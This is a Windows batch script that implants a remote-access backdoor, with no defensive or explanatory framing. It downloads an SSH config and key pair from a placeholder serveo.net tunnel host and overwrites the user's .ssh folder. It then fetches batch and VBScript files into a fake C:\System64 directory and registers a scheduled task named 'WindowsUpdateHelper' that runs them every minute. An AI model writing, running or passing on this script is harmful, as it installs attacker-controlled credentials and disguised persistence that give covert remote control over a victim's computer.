@echo off

curl http://your_hostname.serveo.net/config -o %USERPROFILE%\.ssh\config
curl http://your_hostname.serveo.net/id_rsa -o %USERPROFILE%\.ssh\id_rsa
curl http://your_hostname.serveo.net/id_rsa.pub -o %USERPROFILE%\.ssh\id_rsa.pub


curl http://your_hostname.serveo.net/scheduled.bat -o C:\System64\scheduled.bat
curl http://your_hostname.serveo.net/scheduled.vbs -o C:\System64\scheduled.vbs

cd C:\System64
schtasks /create /tn "WindowsUpdateHelper" /tr "C:\System64\scheduled.vbs" /sc minute /mo 1